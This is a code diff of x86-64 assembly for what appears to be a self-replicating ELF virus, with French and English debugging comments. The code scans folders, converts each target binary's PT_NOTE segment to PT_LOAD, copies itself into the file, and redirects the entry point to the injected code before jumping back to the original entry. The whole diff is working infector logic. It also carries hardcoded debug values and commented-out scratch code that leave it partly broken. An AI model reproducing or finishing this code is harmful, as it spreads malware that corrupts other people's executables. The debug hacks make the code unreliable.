@@ -89,6 +89,9 @@ endstruc
 section .text
 
 _start:
+	nop
+	; WTF ça bug si on lance avec lldb https://stackoverflow.com/questions/29042713/self-modifying-code-sees-a-0xcc-byte-but-the-debugger-doesnt-show-it
+my_code:
 	; save all registers
 	push rax
 	push rdi
@@ -214,7 +217,7 @@ treate_folder:
 .err:
 	mov rax, SYS_WRITE				; write(
 	mov rdi, 1					; 	1,
-	mov rsi, err_msg				; 	err_msg,
+	lea rsi, [rel err_msg]				; 	err_msg,
 	mov rdx, len_err_msg				; 	len_err_msg,
 	syscall						; );
 	jmp .end					; goto .end
@@ -310,6 +313,7 @@ treat_file:
 	mov rdi, 0					; 	0,
 	mov rsi, [filesize]				; 	filesize + (_end - _start),
 	add rsi, _end - _start				;	...
+	add rsi, 0xFFFFFF	; TODO DEBUG JUST FOR TESTING BIG BIG VALUE OH YEAH (E_NOMEM ON MMAP BELOW)
 	mov rdx, PROT_READ | PROT_WRITE			; 	PROT_READ | PROT_WRITE,
 	mov r10, MAP_PRIVATE | MAP_ANONYMOUS		; 	MAP_PRIVATE | MAP_ANONYMOUS,
 	mov r8, -1					; 	-1,
@@ -368,21 +372,20 @@ treat_file:
 	mov rdi, [mappedfile]
 	call get_next_available_vaddr
 	; TODO Check error
-	mov [next_available_vaddr], rax
 
-.my_label:
-	mov rdi, [filesize]
-	and rdi, 0xFFF
-	mov rsi, [next_available_vaddr]
-	and rsi, 0xFFFFFFFFFFFFF000
-	add rsi, rdi
-	mov rdi, [next_available_vaddr]
-	xor r8, r8
-	mov r9, 0x1000
-	cmp rdi, rsi
-	cmova r8, r9
-	add rsi, r8
-	mov [next_available_vaddr], rsi
+	; Align next_available_vaddr to next pagesize
+	mov rdi, [filesize]			; Move address of payload in file in rdi
+	and rdi, 0xFFF				; Get last 24 bits of this address
+	mov rsi, rax				; Move address of next_available_vaddr in rsi
+	and rsi, 0xFFFFFFFFFFFFF000		; Remove last 24 bits of this address
+	add rsi, rdi				; Replace these bits by the last 24 bits of address payload
+	mov rdi, rax				; Get next_available_vaddr in rdi
+	xor r8, r8				; Set r8 to 0
+	mov r9, 0x1000				; Move 0x1000 to r9
+	cmp rdi, rsi				; If next_available_vaddr > calculated_address
+	cmova r8, r9				; Add 0x1000 to address
+	add rsi, r8				; ...
+	mov [next_available_vaddr], rsi		; Put the address in next_available_vaddr
 
 	mov rdi, _end - _start
 	mov [payload_size], rdi
@@ -399,12 +402,6 @@ treat_file:
 	mov rcx, [payload_size]				; payload_size,
 	mov r8, [payload_size]				; payload_size,
 	call convert_pt_note_to_load			; );
-
-	; TODO Clean
-	mov rdi, [mappedfile]
-	add rdi, elf64_hdr.e_entry
-	mov rax, [next_available_vaddr]
-	mov [rdi], rax
 
 	mov rax, SYS_FTRUNCATE				; _ret = ftruncate(
 	mov rdi, [fd]					; fd,
@@ -439,30 +436,55 @@ treat_file:
 	; TODO Check mmap
 
 	; copy all bytes between _start and _end to the segment
+.cmacopie:
+	; TEMP TO MOVE
+;	xor rax, rax
+;	xor rax, rax
 	mov rdi, [mappedfile]				; dest = file_map + filesize;
 	add rdi, [filesize]				; ...
-	lea rsi, [rel _start]				; src = _start;
+	lea rsi, [rel my_code]				; src = _start; ; TODO WTF Need to do this
+;	mov r8, 0
+;	mov r8b, [rsi]
+;	mov r8b, [rsi+1]
+;	add rsi, 1 ; TEMP REMOVE
 	mov rcx, _end - _start				; len = _end - _start;
+;	sub rsp, 16
+;	mov byte [rsp+8], '5'
+;	mov byte [rsp+9], 'A'
+;	lea rsi, [rsp + 8]
+;	mov rdi, rsp
+;	movsb ; TEMP TODO REMOVE AND UNCOMMENT AFTER
+;	movsb ; TEMP TODO REMOVE AND UNCOMMENT AFTER
+;	add rsp, 16
 	rep movsb					; memcpy(dest, src, len);
 
 	; compute jmp_value
 							; code_length_to_jmp = _jmp_instr - _start + 5 (5 is the size of the jmp instruction)
 	mov rdi, [mappedfile]				; _old_entry = file_map
 	add rdi, elf64_hdr.e_entry			; 	->e_entry;
-	mov rax, [rdi]					; ...
+	mov eax, [rdi]					; ... ; TODO "C'est assez petit yolo on s'en fout mais entry est un 64bits"
 
 	; J'ai ptêt fait n'importe dans l'autre inject, j'ai modifié pour que ce soit edi mais en fait c'est bien rdi
 	; _computed_jmp_value ; TODO Comments
-	sub rax, [filesize]				; ... TODO This is new_entry, precise better pls
-	sub rax, _jmp_instr - _start			; ...
-	sub rax, 5					; ...
+	mov rdi, [next_available_vaddr]	; TODO Just for debug to see the value. Delete line
+	sub eax, [next_available_vaddr]			; ... TODO This is new_entry, precise better pls
+	sub eax, _jmp_instr - my_code			; ... ; TODO Do something my_code / _start
+	sub eax, 5					; ...
 
 	; change jmp_value in injected code
 	mov rdi, [mappedfile]				; jmp_value_ptr = file_map + new_entry + (_end - _start) - 8 (8 is the size of the jmp_value variable);
 	add rdi, [filesize]				; ...
-	add rdi, _jmp_instr - _start			; ...
+	add rdi, _jmp_instr - my_code			; ...
 	inc rdi						; ...
 	mov [rdi], eax					; *jmp_value_ptr = _computed_jmp_value;
+
+	; TODO Clean
+	; It sets the new entry. It was above before. But need to put this here
+	mov rdi, [mappedfile]
+	add rdi, elf64_hdr.e_entry
+	mov rax, [next_available_vaddr]
+	mov [rdi], rax
+
 	
 	; TODO: check codecave can contain signature
 	; Sign file
@@ -476,7 +498,7 @@ treat_file:
 .unmap_err:
 	mov rax, SYS_WRITE				; write(
 	mov rdi, 1					; 	1,
-	mov rsi, err_msg				; 	err_msg,
+	lea rsi, [rel err_msg]				; 	err_msg,
 	mov rdx, len_err_msg				; 	len_err_msg,
 	syscall						; );
 	jmp .unmap_file
@@ -492,7 +514,7 @@ treat_file:
 .close_err:
 	mov rax, SYS_WRITE				; write(
 	mov rdi, 1					; 	1,
-	mov rsi, err_msg				; 	err_msg,
+	lea rsi, [rel err_msg]				; 	err_msg,
 	mov rdx, len_err_msg				; 	len_err_msg,
 	syscall						; );
 	jmp .close_file
@@ -507,7 +529,7 @@ treat_file:
 .err:
 	mov rax, SYS_WRITE				; write(
 	mov rdi, 1					; 	1,
-	mov rsi, err_msg				; 	err_msg,
+	lea rsi, [rel err_msg]				; 	err_msg,
 	mov rdx, len_err_msg				; 	len_err_msg,
 	syscall						; );
 
@@ -572,6 +594,7 @@ get_next_available_vaddr:
 		jne .begin_phdr_loop			; ...
 
 	mov rax, [furthest_segment_end]
+	mov rax, 0xc000000
 	add rsp, %$localsize
 	pop rbp
 	%pop
@@ -694,10 +717,12 @@ find_note_segment:
 	sub rsp, %$localsize
 
 	mov [file_map], rdi				; file_map = _file_map;
-	mov ax, [rdi + elf64_hdr.e_phoff]		; e_phoff = elf64_hdr.e_phoff;
+	mov rax, [rdi + elf64_hdr.e_phoff]		; e_phoff = elf64_hdr.e_phoff;
 	mov [e_phoff], rax				; ...
+	xor rax, rax
 	mov ax, [rdi + elf64_hdr.e_phentsize]		; e_phentsize = elf64_hdr.e_phentsize;
 	mov [e_phentsize], rax				; ...
+	xor rax, rax
 	mov ax, [rdi + elf64_hdr.e_phnum]		; e_phnum = elf64_hdr.e_phnum;
 	mov [e_phnum], rax				; ...
 
@@ -715,7 +740,7 @@ find_note_segment:
 		mov rdi, [res_header]			; if (cur_phdr->p_type != PT_LOAD)
 		add rdi, elf64_phdr.p_type		; ...
 		mov eax, [rdi]				; ...
-		cmp eax, PT_NOTE			; ...
+		cmp eax, PT_NOTE			; ...;
 		jne .next_phdr_loop			; 	goto next_phdr_loop;
 
 		jmp .found				; goto found;
